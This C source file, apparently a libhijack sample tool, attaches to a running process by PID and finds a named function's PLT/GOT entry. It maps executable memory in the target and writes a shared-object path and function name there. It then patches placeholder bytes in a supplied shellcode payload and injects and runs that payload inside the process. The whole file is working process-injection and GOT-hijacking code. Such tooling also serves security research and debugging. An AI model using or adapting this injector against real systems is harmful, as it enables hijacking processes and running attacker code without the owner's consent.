/*
 * Copyright (c) 2018, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above
 *      copyright notice, this list of conditions and the following
 *      disclaimer in the documentation and/or other materials
 *      provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <fcntl.h>

#include <hijack.h>

void
usage(char *name, int err)
{

	fprintf(stderr, "USAGE: %s -p pid -i inject -s so -f func\n",
	    name);
	exit(err);
}

int
main(int argc, char *argv[])
{
	unsigned long addr, mapping, pltgot_addr;
	char *inject, *so, *targetfunc;
	FUNC *func, *funcs;
	struct stat sb;
	void *map, *p1;
	HIJACK *ctx;
	int ch, fd;
	pid_t pid;

	pid = -1;
	while ((ch = getopt(argc, argv, "i:f:p:s:")) != -1) {
		switch (ch) {
		case 'i':
			inject = optarg;
			break;
		case 'f':
			targetfunc = optarg;
			break;
		case 'p':
			if (sscanf(optarg, "%d", &pid) != 1)
				usage(argv[0], 1);
			break;
		case 's':
			so = optarg;
			break;
		default:
			usage(argv[0], 0);
		}
	}

	if (inject == NULL)
		usage(argv[0], 1);
	if (targetfunc == NULL)
		usage(argv[0], 1);
	if (pid == -1)
		usage(argv[0], 1);
	if (so == NULL)
		usage(argv[0], 1);

	ctx = InitHijack(F_DEFAULT | F_DEBUG | F_DEBUG_VERBOSE);
	if (ctx == NULL) {
		fprintf(stderr, "[-] Could not create the libhijack ctx\n");
		exit(1);
	}

	fd = open(inject, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

	memset(&sb, 0, sizeof(sb));
	if (fstat(fd, &sb)) {
		perror("fstat");
		exit(1);
	}

	map = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE,
	    MAP_PRIVATE, fd, 0);

	if (map == MAP_FAILED && errno) {
		perror("mmap");
		close(fd);
		exit(1);
	}

	AssignPid(ctx, pid);

	if (Attach(ctx)) {
		fprintf(stderr, "[-] Could not attach to the process\n");
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}

	LocateAllFunctions(ctx);
	LocateSystemCall(ctx);

	pltgot_addr = 0;
	funcs = FindAllFunctionsByName(ctx, targetfunc, true);
	for (func = funcs; func != NULL; func = func->next) {
		if (!(func->name))
			continue;

		printf("Found %s in %s at 0x%016lx\n", targetfunc,
		    func->libname, func->vaddr);

		pltgot_addr = FindFunctionInGot(ctx, ctx->pltgot,
		    func->vaddr);
		if (pltgot_addr > 0)
			break;
	}

	if (pltgot_addr == 0) {
		fprintf(stderr, "[-] Could not find %s in the PLT/GOT\n",
		    targetfunc);
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}

	fprintf(stderr, "[+] Found pltgot address at 0x%016lx\n",
	    pltgot_addr);

	mapping = MapMemory(ctx, (unsigned long)NULL, 4096,
	    PROT_READ | PROT_EXEC, MAP_ANONYMOUS | MAP_SHARED);
	if (mapping == (unsigned long)NULL) {
		fprintf(stderr, "[-] Could not create anonymous mapping\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}

	fprintf(stderr, "[+] Mapping at 0x%016lx\n", mapping);
	fprintf(stderr, "[+] %s at 0x%016lx (0x%016lx)\n",
	    targetfunc, func->vaddr, pltgot_addr);

	WriteData(ctx, mapping, (unsigned char *)so, strlen(so));
	p1 = memmem(map, sb.st_size, "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for so in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}

	memmove(p1, &mapping, 8);
	addr = mapping + strlen(so) + 1;
	WriteData(ctx, addr, (unsigned char *)targetfunc,
	    strlen(targetfunc));

	p1 = memmem(map, sb.st_size, "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for func in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}

	memmove(p1, &addr, 8);
	addr += strlen(targetfunc) + 1;

	p1 = memmem(map, sb.st_size, "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
	if (p1 == NULL) {
		fprintf(stderr, "[-] Could not find placemarker for pltgot in payload\n");
		Detach(ctx);
		munmap(map, sb.st_size);
		close(fd);
		exit(1);
	}
	memmove(p1, &pltgot_addr, 8);
	fprintf(stderr, "[+] shellcode injected at 0x%016lx\n", addr);

	InjectShellcodeFromMemoryAndRun(ctx, addr, map,
	    sb.st_size, true);

	munmap(map, sb.st_size);
	close(fd);
	Detach(ctx);
	return (0);
}
